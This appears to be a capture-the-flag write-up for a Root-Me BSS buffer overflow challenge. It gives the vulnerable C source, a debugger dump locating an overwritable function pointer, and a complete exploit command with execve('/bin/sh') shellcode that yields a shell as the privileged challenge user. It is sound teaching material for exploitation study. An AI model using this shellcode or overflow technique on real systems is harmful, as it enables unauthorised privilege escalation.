# ELF x86 - BSS buffer overflow

- Problem: https://www.root-me.org/en/Challenges/App-System/ELF-x86-BSS-buffer-overflow

Binary Info
```
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable  FILE
Partial RELRO   No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   69 Symbols     No       0               1       ./ch7
ASLR is OFF
```

We can see the source code as follows.
```
#include <stdio.h>
#include <stdlib.h>

char username[512] = {1};
void (*_atexit)(int) =  exit;

void cp_username(char *name, const char *arg)
{
  while((*(name++) = *(arg++)));
  *name = 0;
}

int main(int argc, char **argv)
{
  if(argc != 2)
    {
      printf("[-] Usage : %s <username>\n", argv[0]);
      exit(0);
    }

  cp_username(username, argv[1]);
  printf("[+] Running program with username : %s\n", username);

  _atexit(0);
  return 0;
}
```

As you can see, we can overflow username with over 512 bytes.
Let's test as follows.
```
app-systeme-ch7@challenge02:~$ ./ch7 $(python -c 'print "A"*512')
[+] Running program with username : AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Segmentation fault
```

We can check the position of exit address using gef.
```
gef➤  x/512x 0x0804a040
0x804a040 <username>:   0x41414141      0x41414141      0x41414141      0x41414141
0x804a050 <username+16>:        0x41414141      0x41414141      0x41414141      0x41414141
0x804a060 <username+32>:        0x41414141      0x41414141      0x41414141      0x41414141
0x804a070 <username+48>:        0x41414141      0x41414141      0x41414141      0x41414141
0x804a080 <username+64>:        0x41414141      0x41414141      0x41414141      0x41414141
0x804a090 <username+80>:        0x41414141      0x41414141      0x41414141      0x41414141
0x804a0a0 <username+96>:        0x41414141      0x41414141      0x41414141      0x41414141
0x804a0b0 <username+112>:       0x41414141      0x41414141      0x41414141      0x41414141
0x804a0c0 <username+128>:       0x41414141      0x41414141      0x41414141      0x41414141
0x804a0d0 <username+144>:       0x41414141      0x41414141      0x41414141      0x41414141
0x804a0e0 <username+160>:       0x41414141      0x41414141      0x41414141      0x41414141
0x804a0f0 <username+176>:       0x41414141      0x41414141      0x41414141      0x41414141
0x804a100 <username+192>:       0x41414141      0x41414141      0x41414141      0x41414141
0x804a110 <username+208>:       0x41414141      0x41414141      0x41414141      0x41414141
0x804a120 <username+224>:       0x41414141      0x41414141      0x41414141      0x41414141
0x804a130 <username+240>:       0x41414141      0x41414141      0x41414141      0x41414141
0x804a140 <username+256>:       0x41414141      0x41414141      0x41414141      0x41414141
0x804a150 <username+272>:       0x41414141      0x41414141      0x41414141      0x41414141
0x804a160 <username+288>:       0x41414141      0x41414141      0x41414141      0x41414141
0x804a170 <username+304>:       0x41414141      0x41414141      0x41414141      0x41414141
0x804a180 <username+320>:       0x41414141      0x41414141      0x41414141      0x41414141
0x804a190 <username+336>:       0x41414141      0x41414141      0x41414141      0x41414141
0x804a1a0 <username+352>:       0x41414141      0x41414141      0x41414141      0x41414141
0x804a1b0 <username+368>:       0x41414141      0x41414141      0x41414141      0x41414141
0x804a1c0 <username+384>:       0x41414141      0x41414141      0x41414141      0x41414141
0x804a1d0 <username+400>:       0x41414141      0x41414141      0x41414141      0x41414141
0x804a1e0 <username+416>:       0x41414141      0x41414141      0x41414141      0x41414141
0x804a1f0 <username+432>:       0x41414141      0x41414141      0x41414141      0x41414141
0x804a200 <username+448>:       0x41414141      0x41414141      0x41414141      0x41414141
0x804a210 <username+464>:       0x41414141      0x41414141      0x41414141      0x41414141
0x804a220 <username+480>:       0x41414141      0x41414141      0x41414141      0x41414141
0x804a230 <username+496>:       0x41414141      0x41414141      0x41414141      0x41414141
0x804a240 <_atexit>:    0x42424242      0x00000000      0x00000000      0x00000000          -> address of exit
0x804a250:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a260:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a270:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a280:      0x00000000      0x00000000      0x00000000      0x00000000
```

payload
```
-------------------------------------------------------------------
| nopsled (471 byte) | shellcode (41 byte) | buf address (4 byte) |
-------------------------------------------------------------------
```

```
app-systeme-ch7@challenge02:~$ ./ch7 $(python -c 'print "\x90"*471+"\x31\xc0\xb0\x31\xcd\x80\x89\xc3\x89\xc1\x31\xc0\xb0\x46\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80"+"\x40\xa0\x04\x08"')
[+] Running program with username : ▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒1▒1̀▒É▒1▒F̀1▒Ph//shh/bin▒▒PS▒▒1Ұ
                                                               ̀@▒
$ id
uid=1207(app-systeme-ch7-cracked) gid=1107(app-systeme-ch7) groups=1107(app-systeme-ch7),100(users)
$ cat .passwd
{ password }
```
